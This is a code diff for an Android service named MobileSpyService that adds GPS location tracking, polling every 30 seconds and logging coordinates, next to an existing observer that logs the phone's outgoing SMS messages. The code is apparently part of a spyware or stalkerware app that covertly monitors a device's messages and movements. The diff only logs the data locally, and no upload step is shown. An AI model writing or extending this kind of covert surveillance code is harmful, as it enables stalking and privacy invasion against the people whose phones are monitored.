@@ -14,6 +14,9 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.ContentObserver;
 import android.database.Cursor;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.IBinder;
@@ -38,6 +41,7 @@ public class MobileSpyService extends Service {
 	private String phoneNumber;
 	private Timer timer;
 	private ContentObserver observer;
+	private LocationListener listener;
 
 	@Override
 	public void onCreate() {
@@ -50,6 +54,7 @@ public class MobileSpyService extends Service {
 				settings.getString(MobileSpy.USERNAME_FIELD, ""),
 				settings.getString(MobileSpy.PASSWORD_FIELD, ""));
 		registerSmsEventObserver();
+		registerLocationListener();
 	}
 	
 	@Override
@@ -64,16 +69,15 @@ public class MobileSpyService extends Service {
 			}
 		}, 500);
 	}
-	
+
 	protected void onHandleIntent(Intent intent) {
 		int eventType = intent.getExtras().getInt(EXTRA_EVENT_TYPE);
 		switch (eventType) {
 		case MobileSpyService.EVENT_TYPE_PHONE_ACTIVATED:
 			// This is just a dummy event but do not remove it!
 			// It is employed for creating an instance of this
-			// object and therefore registering the SMS content
-			// observer. See onCreate and registerSmsEventObserver
-			// for more information.
+			// object and therefore registering some listeners.
+			// See #onCreate for more information.
 			break;
 			
 		case EVENT_TYPE_SMS:
@@ -92,20 +96,57 @@ public class MobileSpyService extends Service {
 	}
 
 	/**
+	 * Register GPS location change events for periodically notified.
+	 */
+	private void registerLocationListener() {
+		if (listener != null) {
+			return;
+		}
+		listener = new LocationListener() {
+			public void onLocationChanged(Location location) {
+				if (location != null) {
+					Logger.getDefault().debug(
+						"Location: " + location.getLongitude() + ":" + location.getLatitude());
+				}
+			}
+
+			public void onProviderDisabled(String provider) {
+			}
+
+			public void onProviderEnabled(String provider) {
+			}
+
+			public void onStatusChanged(String provider, int status, Bundle extras) {
+			}
+		};
+		LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+		manager.requestLocationUpdates(
+				LocationManager.GPS_PROVIDER, 30000L, 0.0f, listener);
+	}
+
+	/**
 	 * Register a content observer for SMS events
 	 */
 	private void registerSmsEventObserver() {
-		if (observer == null) {
-			observer = new ContentObserver(null) {
-				public void onChange(boolean selfChange) {
-					logSMS(MobileSpyService.this);
-				}
-			};
-			getContentResolver().registerContentObserver(
-				Uri.parse(CONTENT_SMS), true, observer);
+		if (observer != null) {
+			return;
 		}
+		observer = new ContentObserver(null) {
+			public void onChange(boolean selfChange) {
+				logSMS(MobileSpyService.this);
+			}
+		};
+		getContentResolver().registerContentObserver(
+			Uri.parse(CONTENT_SMS), true, observer);
 	}
 
+	/**
+	 * This is invoked directly from the SMS observer to log
+	 * outgoing SMS only. An elegant method would be firing 
+	 * an intent to the BroadcastReceiver instead.
+	 * 
+	 * @param context
+	 */
 	private void logSMS(Context context) {
 		Cursor cursor = getContentResolver().query(
 				Uri.parse(CONTENT_SMS), null, null, null, null);
